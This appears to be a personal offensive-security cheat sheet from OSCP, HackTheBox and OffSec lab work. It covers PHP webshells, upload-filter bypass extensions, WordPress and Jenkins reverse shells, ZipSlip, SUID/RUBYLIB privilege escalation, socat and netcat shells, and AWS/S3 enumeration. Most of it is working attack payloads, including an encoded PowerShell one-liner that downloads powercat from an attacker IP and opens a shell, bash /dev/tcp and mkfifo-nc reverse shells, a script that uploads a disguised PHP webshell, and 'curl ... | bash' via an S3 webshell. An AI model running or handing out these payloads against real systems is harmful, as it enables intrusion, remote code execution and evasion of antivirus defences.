PS:> C:\> C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc WwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACIAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuACIAKwAkACgAIgA0ADEAIAA2AEQAIAA3ADMAIAA2ADkAIAA1ADUAIAA3ADQAIAA2ADkAIAA2AEMAIAA3ADMAIgAuAFMAcABsAGkAdAAoACIAIAAiACkAfABmAG8AcgBFAGEAYwBoAHsAWwBjAGgAYQByAF0AKABbAGMAbwBuAHYAZQByAHQAXQA6ADoAdABvAGkAbgB0ADEANgAoACQAXwAsADEANgApACkAfQB8AGYAbwByAEUAYQBjAGgAewAkAHIAZQBzAHUAbAB0AD0AJAByAGUAcwB1AGwAdAArACQAXwB9ADsAJAByAGUAcwB1AGwAdAApACkALgBHAGUAdABGAGkAZQBsAGQAKAAkACgAIgA2ADEAIAA2AEQAIAA3ADMAIAA2ADkAIAA0ADkAIAA2AEUAIAA2ADkAIAA3ADQAIAA0ADYAIAA2ADEAIAA2ADkAIAA2AEMAIAA2ADUAIAA2ADQAIgAuAFMAcABsAGkAdAAoACIAIAAiACkAfABmAG8AcgBFAGEAYwBoAHsAWwBjAGgAYQByAF0AKABbAGMAbwBuAHYAZQByAHQAXQA6ADoAdABvAGkAbgB0ADEANgAoACQAXwAsADEANgApACkAfQB8AGYAbwByAEUAYQBjAGgAewAkAHIAZQBzAHUAbAB0ADIAPQAkAHIAZQBzAHUAbAB0ADIAKwAkAF8AfQA7ACQAcgBlAHMAdQBsAHQAMgApACwAIgBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACIAKQAuAFMAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAAsACQAdAByAHUAZQApADsAIABJAEUAWAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA1AC4AMQA1ADkAOgA4ADAAMAAwAC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAIgApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA5ACAALQBwACAAOQA5ADkAOQAgAC0AZQAgAGMAbQBkAC4AZQB4AGUA         # 1 liner Reverse shell for AD - Example of the encoded String BLOB if you need to
```

# Port forwarding with ScShell.py and proxychains with 1 liner Reverse shell for AD and B64 BLOB
**ScShell** is a workaround for fileless way to get a Remote shell ( https://github.com/Mr-Un1k0d3r/SCShell )

ScShell.py will hijack a service (so it hides from AV), edit it and then place commands you want within the service; eg spawn a shell within that service , sometimes a system service.   
```sh
K:$ proxychains /home/kali/OSCP/AD+Win-Tools/scshell.py svc-auth@192.168.179.215         # SCShell.py reverse shell with a B64 blob ,for Windows Privesc
PS:> C:\Windows\system32\WindowsPowerShell\v1.0> .\powershell.exe -enc <B64-BLOB>        # SCShell.py reverse shell with a B64 blob after dissabling  Defender, and doing the encode etc ,for Windows Privesc

```

 
```sh
proxychains python3 /home/kali/OSCP/AD+Win-Tools/scshell.py svc-auth@192.168.179.215

# THEN WE Run our Bases64Encoded command which after disabling Defender, and doing the encode etc ( scshell.py) 

C:\Windows\system32\WindowsPowerShell\v1.0> .\powershell.exe -enc <BASE64-BLOB>                 # scshell.py
```


### PHP server 
`php -S localhost:9000`   - Serves up on localhost:9000

### Php File upload to RCE
If we save the following as `backdoor.php` and try to upoad it:
- `<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>`
It will allows us to append the parameter `cmd` to our request (to `backdoor.php`), which will be executed using `shell_exec()`. 
This is if we can determine backdoor.php's location, if backdoor.php will be rendered successfully and if no PHP function restrictions exist.


Basic file upload list below from mHacktricks 2025 
```sh
.php
.php2
.php3
.php4
.php5
.php6
.php7
.phps
.pht
.phtm
.phtml
.pgif
.shtml
.htaccess
.phar
.inc
.hphp
.ctp
.module
.php
.php4
.php5
.phtml
.module
.inc
.hphp
.ctp
.asp
.aspx
.config
.ashx
.asmx
.aspq
.axd
.cshtm
.cshtml
.rem
.soap
.vbhtm
.vbhtml
.asa
.cer
.shtml
.jsp
.jspx
.jsw
.jsv
.jspf
.wss
.do
.action
.cfm
.cfml
.cfc
.dbm
.swf
.pl
.cgi
.yaws
.png.php
.png.Php5
.php%20
.php%0a
.php%00
.php%0d%0a
.php/
.php.\
.
.php....
.pHp5....
.png.php
.png.pHp5
.php#.png
.php%00.png
.php\x00.png
.php%0a.png
.php%0d%0a.png
.phpJunk123png
.png.jpg.php
.php%00.png%00.jpg
.php.png
```
##### Ippsecs RCE for php
- `<?php system($_REQUEST['cmd']);?>`
- 
#### PHP webshell
Note: in php webshells its best to use `REQUEST` rather than `GET` as you can use both `GET` and `POST` 
IPP preferes sending `POST` req becasue 
- they wont show up on Apache Access logs
- Less bad chars as a POST so the comoand is liess likly ot screww up
eg htb buff 

#### More persistan webshell 
TO get a persistant shell
- `cp /opt/useful/SecLists/Web-Shells/FuzzDB/nc.exe .`
- `nc -lvnp 4444`
- `powershell InvokeWebRequest -Uri http://10.10.14.106:4444/nc.exe -Outfile c:\Users\Public\nc.exe`


Note: running `rlwrap nc -lvnp 4444` will allow you _left right up down_ in your shell

<details>
	<summary>python webshell script</summary>

```sh

#!/usr/bin/env python3
import requests

def Main():
    url = "http://10.10.10.198:8080/upload.php?id=test"
    s = requests.Session()
    s.get(url, verify=False)
    
    # Magic bytes to look like a png
    PNG_magicBytes = '\x89\x50\x4e\x47\x0d\x0a\x1a'
    png = {
            'file':
            (
                'test.php.png',         # get round the file extension check

                # Run webshell commands 
                PNG_magicBytes+'\n'+'<?php echo shell_exec($_GET["cmd"]); ?>', 
                'image/png',
                {'Content-Disposition': 'form-data'}
                # eg; curl http://10.129.25.107:8080/upload/test.php?cmd=whoami
                )           
            }
    data = {'pupload': 'upload'}
    r = s.post(url=url, files=png, data=data, verify=False)
    print("Uploaded!")

if __name__ == "__main__":
    Main()
```
</details>>


### Decrypt a file from a public RSA key (HTB: Weak RSA)
```
python3 /root/Tools/RsaCtfTool/RsaCtfTool.py --publickey <PUBLIC_KEY> --private --output <PRIVATE_KEY_NEW_NAME>
python3 /root/Tools/RsaCtfTool/RsaCtfTool.py --publickey <PUBLIC_KEY> --private <PRIVATE_KEY_NEW_NAME>.key --uncipherfile <INPUT_CIPHER_FILE> 
openssl pkeyutl -in <INPUT_CIPHER_FILE> -out flag.txt -decrypt -inkey <PRIVATE_KEY_NEW_NAME>
```


### Decrypting  DES when we find a static IV/key
Come across a hard coded  key `87629ae8` in some code () which we convert to hex `38 37 36 32 39 61 65 38`)


```py
...
def backup(name, file):
    dest_dir = os.path.dirname(os.path.realpath(__file__)) + '/data'
    dest_name = hashlib.sha224(name.encode('utf-8')).hexdigest()
    with open('{}/{}'.format(dest_dir, dest_name), 'wb') as dest:
        data = file.read()
        k = des(b"87629ae8", CBC, b"\0\0\0\0\0\0\0\0", pad=None, padmode=PAD_PKCS5)
        cipertext = k.encrypt(data)
        dest.write(cipertext)
...
```


We can now decrypt a file ...
```
openssl enc -d -des-cbc -K 3837363239616538 -iv "0000000000000000" -in <FILENAME> -out decrypt
```

... OR multiple files - assuming that we put al the files in a dir called `data` 

```
for FILE in ./data/* ; do openssl enc -d -des-cbc -K 3837363239616538 -iv "0000000000000000" -in $FILE -out ./OUT-DATA/$(basename "$FILE"); done 
```

We can then see the kinds of files we have 
```
file OUT-DATA/*
```
(fyi Python DES [see docs](https://pypi.org/project/des/)) 

---



### Php Type Juggling 

PHP type juggling / loose comparison combined with `intval()` being used as “validation”.

Will treat these two as the same and not really validate the input:
- `intval("25");`
- `intval("25 this is vuln");`

so we can smuggle in SQL commdns like: `' and 1=2 UNION select 'boss\' union select \'/etc/passwd\'-- -'-- -`

Like in HTB Unattended
```
https://www.nestedflanders.htb/index.php?id=25%27%20and%201=2%20UNION%20select%20%27boss\%27%20union%20select%20\%27/etc/passwd\%27--%20-%27--%20-
```


##### Offsec Potato example

- Read in the walkthrough here - https://github.com/JunglistHyperD/CTFs/blob/main/ctf_NOTES_obs/COMPLETED/OffSec/Potato-L-O-101/Walkthrough%20-%20Offfsec%20Potato.md#php-type-juggling-and-authentication-bypass

```php
<html>
<head></head>
<body>

<?php

$pass= "potato"; //note Change this password regularly

if($_GET['login']==="1"){
    // // !!! Vulnerable below: using == with strcmp() lets arrays make strcmp return NULL, which == 0 treats as true, so auth is bypassed
  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
    echo "Welcome! </br> Go to the <a href=\"dashboard.php\">dashboard</a>";
    setcookie('pass', $pass, time() + 365*24*3600);
  }else{
    echo "<p>Bad login/password! </br> Return to the <a href=\"index.php\">login page</a> <p>";
  }
  exit();
}
?>


  <form action="index.php?login=1" method="POST">
                <h1>Login</h1>
                <label><b>User:</b></label>
                <input type="text" name="username" required>
                </br>
                <label><b>Password:</b></label>
                <input type="password" name="password" required>
                </br>
                <input type="submit" id='submit' value='Login' >
  </form>
</body>
</html>

```


### Ippsec on PHP Type Juggling Confusion
First thing you want to do is to identify what tech is on the back end because this will inform what kinds of attacks you could uses.
Eg: Larvel session cookie means PHP
- API's often accept data via the GET url, or the body
- Recommended this BUG BOUNTY platform - https://app.intigriti.com/researcher/dashboard

### Php phpinfo.php
```sh
K:> curl http://192.168.179.132:45332/phpinfo.php | grep 'DOCUMENT_ROOT' | html2text      # Get the base dir for the web root for the web app. 
```
### php plugin spx 

php plugin spx was vuln to unAuthn'd path traversal in the Offsec Box spx. 


### php zip file upload rce 
- https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#via-zip-fie-upload

If we have uploaded `revshell.php` to a site and it zips it up, we might access or trigger it  - Offsec Zipper
```
example.com/page.php?file=zip://path/to/zip/hello.zip%23revshell.php
```

### ZipSlip (manual zip creation)

0. Work out the *target* path you want the vulnerable app to write, e.g. `/root/web/shell.php`, and how many `../` you need from the **extraction directory** to reach it, e.g. `../../../root/web/shell.php`.

1. On your attack box, create a PHP webshell, e.g. `shell.php`, and put it somewhere convenient. You’ll run `zip` from a directory where the relative path you pass (e.g. `../../../root/web/shell.php`) correctly points to that local file so `zip` can read it.

2. Create the malicious archive, e.g.:
   `sudo zip /tmp/shell.zip ../../../root/web/shell.php`
   This makes a zip whose **internal filename** is `../../../root/web/shell.php`.

3. Upload `shell.zip` via the vulnerable upload/restore feature so the server extracts it and writes the file into the target webroot.
4. Browse to the shell in the web app, e.g.:
   `http://SOME_IP:8080/shell.php`  and use it to run commands / get a reverse shell.


### Php Interactive shell (get a password hash)
```
└─# php -a                                         
Interactive shell

php > echo pasword_hash('smith',PASSWORD_DEFAULT);
PHP Warning:  Uncaught Error: Call to undefined function pasword_hash() in php shell code:1
Stack trace:
#0 {main}
  thrown in php shell code on line 1
php > echo password_hash('smith',PASSWORD_DEFAULT);
$2y$10$BmihttOJCzieM.H2z6oio.aT5JAyj7zJoRt/aum02OiIgekN6CxJu
php > 
php> readline_clear_history();                                    # php Trouble shoot (clear out the terminal in case the commands are bricked. Offsec Megavolt (possibly))
```

### Php in wordpress
We could also replace wp-config.php  in for example the theme: `Themes/twentyfifteen/`
Login to hte wordpress site and modify a php file to include the line:
- echo system($_REQUEST['foo'])
..then we can go to `http://10.129.198.51/?foo=pwd`
- `http://10.129.198.51/?foo=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.103 1234 >/tmp/f`


## Wordpress
The downside is we don't nkow the password for notch
then grep `/var/www/wp-config.php` for credentials
or look in the phpmyadmin database config file `config-db.php` 

A WordPress plugin can be as simple as a PHP script with some basic comments at the front in a zip file.
Re Createing a wordpress plugin ; comments are necessary for WordPress to accept it as a plugin!
Generate exploit wordpress plugins - `https://github.com/wetw0rk/malicious-wordpress-plugin`

**Note:** Best to hack the `Themes` than the `Plugins` **as a bad plugin could crash the site!!!**

If you do need to hack the plugins, this tool worked ok in the OSCP labs - https://github.com/wetw0rk/malicious-wordpress-plugin/blob/master/wordpwn.py

```
wpscan --url http://192.168.179.222 --enumerate u,ap,at,tt,cb,dbe --plugins-detection aggressive --random-user-agent

wpscan --url http://192.168.179.222 --enumerate u,ap,at,tt,cb,dbe --plugins-detection aggressive -o WPscanReport.txt # No output in terminal if writing to a report

wpscan --url http://192.168.179.244 --enumerate u,ap,at,tt,cb,dbe --plugins-detection aggressive --api-token <API_TOKEN>>

# The Output file will make the scan run withour output but keep all the colours when you run `cat REPORT.txt` 

wpscan --url http://192.168.179.244 --enumerate u,ap,at,tt,cb,dbe --plugins-detection aggressive -o WPscanReport.txt --api-token <API_TOKEN>

```
more stealth ??
```
--random-user-agent
```

```
wpscan --url http://loly.lc/wordpress -U users.txt --passwords /usr/share/seclists/Passwords/Common-Credentials/darkweb2017_top-1000.txt
```


##### Wordpresss plugin reverse shell
1. Make a `rs.php` file with something like 
```
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.153/4444 0>&1'");
?>
```
2. Upload it in the plugins installer page 
3. visit your plugin like: `http://sunset-midnight/wp-content/uploads/2026/01/rs.php`





##### wpprobe (tool just for wordpress plugins)

Update the tools
```
wpprobe update          
```

Update the db
```
wpprobe update-db
```

```
wpprobe scan -u http://workaholic.offsec          
```




---


##### SUID binary + Ruby + RUBYLIB privesc Attack Pattern

SUID binary → calls scripting language (Ruby/Python/Perl) → script does require/import → interpreter respects env var load-paths (RUBYLIB/PYTHONPATH/etc.) → I can drop a fake library and get code run as root.

1. Find unusual SUID binaries:
```
find / -type f -perm -4000 2>/dev/null
```
1. If one relates to Ruby (name or strings):
```
strings /path/to/suid | grep -i ruby
strings /path/to/suid | grep -i .rb
```
2. Identify Ruby script it runs (e.g. /usr/local/sbin/xyz.rb):
```
cat /usr/local/sbin/xyz.rb
```
look for: `require 'rubygems'` or `require 'something'`

3. Check Ruby manpage/env vars:
```
# RUBYLIB: extra library search path
# Idea: hijack a required lib (e.g. rubygems.rb)
```

4. Exploit:    # On a writable dir (e.g. /tmp /dev/shm)
```
cd /tmp
cat > rubygems.rb << 'EOF'
```

5. Set or create `RUBYLIB` env var to something wriatebale
```
RUBYLIB=/tmp /usr/local/sbin/check-ruby-gems
```

6. Create the related file : eg `xyz.rb`
```
#! /usr/bin/ruby
`chmod u+s /bin/bash`
```

The backticks run the code as soon as require 'rubygems' runs

7. Now `/bin/bash` is SUID root
```
ls -l /bin/bash   # should show 's' in user perms: -rwsr-xr-x
```

8. Get root shell with persisting permissions
```
bash -p
```





### Ruby Shell

```
echo 'exec "/bin/bash"' > vulnRubyCodeFile.rb              # Add this line to vulnRubyCodeFile.rb and then when its run it will run the command to get a ruby reverse shell
```


## Make a nicer bash shell (perhaps from a php webshell)

```sh
stty -a       # Locally on your own machine get the dimensions of rows and colums
python3 -c 'import pty;pty.spawn("/bin/bash")'  # open the shell on the victim
stty rows XX cols YY   # sret the dimensions on the victim
CTRL+Z
stty raw -echo; fg
export TERM=xterm
```
Note:
`stty raw -echo` is :
- `stty` is a utility to set the terminal options
- `raw` change the modes of the terminal so that no input or output processing is performed
- `-echo` means disable echo
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/sh")'
export TERM=xterm
ctl Z               # background the terminal
stty raw -echo
fg + Enter          # to Forground
```
Note: `stty -a` will list the term and show the columns width so you can set it in the shell
Set it on your box RevShell with `stty columns 136 rows 32`

```
fg %1     # will bring job 1 into the foreground
```

```
stty size                           # Get the tty size of a terminal
stty rows 24 cols 80                # Set the tty size of a terminal
```
### Get a full func reverse shell with python
To obtain a more functional (reverse) shell, execute the below inside the shell gained through the Python script above. Ensure that an active listener (such as Netcat) is in place before executing the below.
`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<VPN/TUN Adapter IP>",<LISTENER PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`

### penelope Reveres shell handler
https://github.com/brightio/penelope

ALso a blog on other ways - https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

Background session to go back to kali host with: Fn + F12    # Penelope Short keys

## Socat shell
Reverse Shell
Victim Linux: `socat exec:'bash -li',pty,stderr,setidsigint,sane tcp:<IP>:<PORT>`
Victim Windows: `socat TCP4:<IP>:<PORT> EXEC:'cmd.exe',pipes`
Attacker: `socat file:`tty`,raw,echo=0 tcp-listen:<PORT>`

`socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock` allows your computer to talk to a specific service that handles system logging and device management, using a special file as a direct line for sending and receiving messages. This is like using a dedicated, internal phone line within your computer to communicate with a specific service efficiently and securely.

#### SOCAT

Socat can encrypt data if we genreate an ssl cirt.
Make some new keys/srt
```
openssl req -newkey rsa:2048 -nodes -keypout shell.key -x509 -days 362 -out shell.crt    `# Socat Shell #`
```
Combine both files together into a `.pem` file then the certs needs to be transferred to the listening side

**Rev Shell**
```
K: sudo socat OPENSSL:192.168.179.22:443,verify=0, EXEC:/bin/bash 
V: socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0, STDOUT
```
Could also add these options to the victim 
```
V: socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0, file:recived.txt,create
```

**Bind Shell**
```
K: socat OPENSSL:192.168.179.22:443,verify=0 STDOUT
V: socat OOPENSSL-LISTEN:443,cert=shell.pem,verify=0 EXEC:'cmd.exe',pipes
```



#### Net Cat reverse shell 
```
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f   # nc Reverse shell - Original open BSD version  - certai Ports might be restricted outbound eg port 80 


ncat 10.0.0.1 4242 -e /bin/bash           # nc Reverse shell - tcp
ncat --udp 10.0.0.1 4242 -e /bin/bash    # nc Reverse shell - udp
```

#### netcat nc from a busy box and more 
http://192.168.179.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec('busybox%20ping%20192.168.179.211%20-e%20sh')%7D")    # OSCP B BErlin - this payload for Text4Shell CVE-2022-42889 used a busybox version of nc 

```sh
acpid, adjtimex, ar, arch, arp, arping, ash, awk, basename, bc, blkdiscard,                                                             # Busybox might contain all of these
blockdev, brctl, bunzip2, busybox, bzcat, bzip2, cal, cat, chgrp, chmod, chown, chpasswd, │                                             # Busybox might contain all of these
chroot, chvt, clear, cmp, cp, cpio, crond, crontab, cttyhack, cut, date, dc, dd,                                                        # Busybox might contain all of these
 deallocvt, depmod, devmem, df, diff, dirname, dmesg, dnsdomainname, dos2unix, dpkg, dpkg-deb, du,                                      # Busybox might contain all of these
dumpkmap, dumpleases, echo, ed, egrep, env, expand, expr, factor, fallocate, false,                                                     # Busybox might contain all of these
fatattr, fdisk, fgrep, find, fold, free, freeramdisk, fsfreeze, fstrim, ftpget,                                                         # Busybox might contain all of these
getty, grep, groups, gunzip, gzip, halt, head, hexdump, hostid, hostname, httpd,                                                        # Busybox might contain all of these
hwclock, i2cdetect, i2cdump, i2cget, i2cset, id, ifconfig, ifdown, ifup, init, insmod, ionice, ip,                                      # Busybox might contain all of these
ipcalc, ipneigh, kill, killall, klogd, last, less, link, linux32, linux64, linuxrc,                                                     # Busybox might contain all of these
ln, loadfont, loadkmap, logger, login, logname, logread, losetup, ls, lsmod, lsscsi, lzcat,                                             # Busybox might contain all of these
lzma, lzop, md5sum, mdev, microcom, mkdir, mkdosfs, mke2fs, mkfifo, mknod, mkpasswd,                                                    # Busybox might contain all of these
mkswap, mktemp, modinfo, modprobe, more, mount, mt, mv, nameif, nc, netstat, nl, nologin,                                               # Busybox might contain all of these
nproc, nsenter, nslookup, nuke, od, openvt, partprobe, passwd, paste, patch, pidof,                                                     # Busybox might contain all of these
ping, ping6, pivot_root, poweroff, printf, ps, pwd, rdate, readlink, realpath, reboot, renice,                                          # Busybox might contain all of these
reset, resume, rev, rm, rmdir, rmmod, route, rpm, rpm2cpio, run-init, run-parts,                                                        # Busybox might contain all of these
sed, seq, setkeycodes, setpriv, setsid, sh, sha1sum, sha256sum, sha512sum, shred, shuf, sleep,                                          # Busybox might contain all of these
sort, ssl_client, start-stop-daemon, stat, static-sh, strings, stty, su, sulogin,                                                       # Busybox might contain all of these
svc, svok, swapoff, swapon, switch_root, sync, sysctl, syslogd, tac, tail, tar, taskset, tc, tee,                                       # Busybox might contain all of these
telnet, telnetd, test, tftp, time, timeout, top, touch, tr, traceroute, traceroute6,                                                    # Busybox might contain all of these
true, truncate, tty, tunctl, ubirename, udhcpc, udhcpd, uevent, umount, uname, uncompress,                                              # Busybox might contain all of these
unexpand, uniq, unix2dos, unlink, unlzma, unshare, unxz, unzip, uptime, usleep,                                                         # Busybox might contain all of these
uudecode, uuencode, vconfig, vi, w, watch, watchdog, wc, wget, which, who, whoami, xargs, xxd, xz, xzcat, yes, zcat                     # Busybox might contain all of these
```


## Simple server python 3 
- `python3 -m http.server 9999`

## Tcpdump 
`tcpdump -i tun0 icmp` 					# opens a listerner for incoming pings

### zeek ( for pcap inspection ?? )
Zeek-cut tool ?
See scavanger htb ippsec

## Jenkins 
`<Jenkins_web_address>:8080/script` # Run groovy code

Basic Jenkinsfile for a reverse shell

```
pipeline {
  agent any
  stages {
    stage('Send Reverse Shell') {
      steps {
        withAWS(region: 'us-east-1', credentials: 'aws_key') {
          script {
            if (isUnix()) {
              sh 'bash -c "bash -i >& /dev/tcp/44.192.10.60/4242 0>&1" & '
            }
          }
        }
      }
    }
  }
}
```
---- 

# Cloud 

- `sudo apt install cloud-enum`

Say you have identified via the dev tools images being pulled fro mthe s3 bucket:
- `https://s3.amazonaws.com/offseclab-assets-public-bxwyrmev/sites/www/images/amethyst.png`

We could scan with
- `cloud_enum -k offseclab-assets-public-bxwyrmev --quickscan --disable-azure --disable-gcp`
	- **--keyword KEYWORD** (**-k KEYWORD**) parameter. We can specify multiple keyword arguments, or we can specify a list with the **--keyfile KEYFILE** (**-kf KEYFILE**) parameter.
	- We can also use the **--mutations** (**-m**) option to specify a file to add extra words to the keyword. If we don't specify any file, the **/usr/lib/cloud-enum/enum_tools/fuzz.txt** file is used by default. We can disable this option using the **--quickscan** (**-qs**) parameter.
	- We'll also only perform a check in AWS, disabling other CSPs with the **--disable-azure** and **--disable-gcp** parameters.


With Bash we could do:

```
for key in "public" "private" "dev" "prod" "development" "production"; do echo "offseclab-assets-$key-bxwyrmev"; done | tee /tmp/keyfile.txt
```

This will produce a new list of potential bucket names which we can then enumerate again.
- `cloud_enum -kf /tmp/keyfile.txt -qs --disable-azure --disable-gcp`

----

## Awscli (S3)
When configureing ,Using an arbitrary value for all the fields an work. 
Sometimes the server is configured to not check authentication (still, it must be configured to something for aws to work).          
```
└─# aws configure 				     
AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp
```
Most basic comand to check all is ok with you aws-cli
```
aws sts get-caller-identity
```

`# Am I using an assumed role or direct user credentials?`
```
aws sts get-session-token
```

```
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2)
```


List all of the S3 buckets hosted by the server
- `aws --endpoint=http://s3.thetoppers.htb s3 ls` 

Use the ls command to list objects and common prefixes under the specified bucket.
- `aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb`

Create a webshell and then copy it to the webserver to get RCE
- `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
- `aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb`
- `http://thetoppers.htb/shell.php?cmd=curl%2010.10.14.105:8000/shell.sh|bash`


#### Quietly investigate AWS creds with
- **Key info check**: `aws --profile challenge sts get-access-key-info --access-key-id AKIA...BLAHEH...XM`
- **Non-existent Lambda**: `aws --profile target lambda invoke --function-name arn:aws:lambda:us-east-1:123456789012:function:nonexistent-function outfile`

#### AWS policy intel
 **Get info on Inline Policies :  directly linked to a single identity, only in that identity space.**
`aws --profile target iam list-user-policies --user-name clouddesk-plove`
**Get info on Managed Policies: distinct, reusable and can be associated with multiple identities**
- `aws --profile target iam list-attached-user-policies --user-name clouddesk-plove` 
**Get info on group membership**
- `aws --profile target iam list-groups-for-user --user-name clouddesk-plove
**Check the inline group policies with:**
- `aws --profile target iam list-group-policies --group-name support`
**Check the managed group policies with:**
- `aws --profile target iam list-attached-group-policies --group-name support`
**Check the version of the policy** 
`aws iam list-policy-versions` for this and specify the policy by its ARN with `--policy-arn`:
- `aws --profile target iam list-policy-versions --policy-arn "arn:aws:iam::aws:policy/job-function/SupportUser"`
Get the policy document with : 
- `aws --profile target iam get-policy-version --policy-arn arn:aws:iam::aws:policy/job-function/SupportUser --version-id v8`


#### AWScli output processing with JMESPath

[_JMESPath_](https://jmespath.org/) is a query language for JSON. It is used to extract and transform elements from a JSON document. We can find more examples on this topic on the [_JMESPath Examples_](https://jmespath.org/examples.html) page and in the [_AWS CLI Filter Output_](https://docs.aws.amazon.com/cli/v1/userguide/cli-usage-filter.html) documentation. We can reduce the number of requests we send by saving all output to a local file and then using an external tool like [_jp_](https://github.com/jmespath/jp) to filter that output with JMESPath expressions.

```sh
# List the usernames only 
aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[].UserName"

# List usernames with admin in
aws --profile target iam get-account-authorization-details --filter User --query "UserDetailList[?contains(UserName, 'admin')].{Name: UserName}"

# Gather all the names of the IAM _Users_ and _Groups_ which contain "/admin/" in their _Path_ key
aws --profile target iam get-account-authorization-details --filter User Group --query "{Users: UserDetailList[?Path=='/admin/'].UserName, Groups: GroupDetailList[?Path=='/admin/'].{Name: GroupName}}"
```

#### Listing out data from a bucket
After configuring the authN `awscli` session  we can enumerate the s3 bucket we found at the endpoint where the images were stored:
- `https://staticcontent-79mc0ke9cdg5fodl.s3.us-east-1.amazonaws.com`

```
aws s3 ls staticcontent-79mc0ke9cdg5fodl
```

#### Aws tools 
- [_Awspx_](https://github.com/WithSecureLabs/awspx), a graph-based tool for visualizing effective access and resource relationships within AWS.
- [_Cloudmapper_](https://github.com/duo-labs/cloudmapper) provides visual representations of AWS configurations, helping identify potential issues. 
- prowler ??

#### Pacu ( aws automated tool)

Some Snippets from the tool https://www.kali.org/tools/pacu/

```
sudo apt install pacu
pacu      # without any arguments, it runs interactive mode.
...
Pacu (enumlab:No Keys Set) > 
Pacu (enumlab:No Keys Set) > import_keys target
  Imported keys as "imported-target"
Pacu (enumlab:imported-target) > ls      # list all availible modules
Pacu (enumlab:imported-target) > help <MODULE_NAME>   # Get help on a particular module
Pacu (enumlab:imported-target) > run <MODULE_NAME> 
Pacu (enumlab:imported-target) > services       # list found items and services 
Pacu (enumlab:imported-target) > data <SERVICES_NAME>    # returns data on found service. Running empty returns all data. 
```


### Web tech analysis tools:
- Whatruns - https://chrome.google.com/webstore/detail/whatruns/cmkdbmfndkfgebldhnkbfhlneefdaaip?hl=en
- Wappalyzer ( has Cli too: https://github.com/gokulapap/wappalyzer-cli )
- `whatweb http://192.168.179.244`  Good too ltoo

	
### Content Discovery
"Better lists; not tools" - JH
See - https://wordlists.assetnote.io/ and search for some of the below strings eg: httparchive_cgi_pl_...

IIS/MSF:
- httparchive_aspx_asp_cfm_svc_ashx_asmx...
- https://github.com/irsdl/IIS-ShortName-Scanner

PHP + CGI
- httparchive_cgi_pl_...
- httparchive_php_...

General API 
- httparchive_apiroutes_...
- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/swagger.
- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/api/api-endpoints.txt
- Nice resource ?? - https://github.com/arainho/awesome-api-security

Bypassing WAF for example on and API can sometimes be done with the `X-Forwarded-For` header

Java
- httparchive_jsp_jspa_do_action

Generic:
- httparchive_directories_1m...
- RAFT lists (see Seclists etc) 
- https://github.com/danielmiessler/RobotsDisallowed
- https://github.com/six2dez/OneListForAll
- https://gist.github.com/jhaddix/b80ea67d85c13206125806f0828f4d10

Also: Search technology on the Asset note site for workdlists

- Source code into URLS to search for : https://github.com/danielmiessler/Source2URL/blob/master/Source2URL

	
Also Generate Wordlists with [Cewl tool](https://www.kali.org/tools/cewl/#:~:text=CeWL%20(Custom%20Word%20List%20generator,addresses%20found%20in%20mailto%20links.)
```
cewl www.TARGET.com -m 6 -w target-PW-List.txt
```


## Burp Plugins list
|                              |                           |                                |
|------------------------------|---------------------------|--------------------------------|
| .NET beautifier              | J2EEScan                  | Software Vulnerability Scanner |
| Software Version Reporter    | Active Scan++             | Additional Scanner Checks      |
| AWS Security Checks          | Backslash Powered Scanner | Wsdler                         |
| Java Deserialization Scanner | C02                       | Cloud Storage Tester           |
| CMS Scanner                  | Error Message Checks      | Detect Dynamic JS              |
| Headers Analyzer             | HTML5 Auditor             | PHP Object Injection Check     |
| JavaScript Security          | Retire.JS                 | CSP Auditor                    |
| Random IP Address Header     | Autorize                  | CSRF Scanner                   |
| JS Link Finder               | Vulners ( JHADDIX)        |                                |
Also : Burp plugin `cookie-editor`

Burp extension to create wordlists - https://github.com/0xDexter0us/Scavenger

Burp short keys (handy)

```
Ctl + T               # burp short keys - Turn intercept on/off  
Ctl + F               # burp short keys - Forward intercepted request  
Ctl + R               # burp short keys - Send to repeater  
Ctl + I               # burp short keys - Send to Intruder  
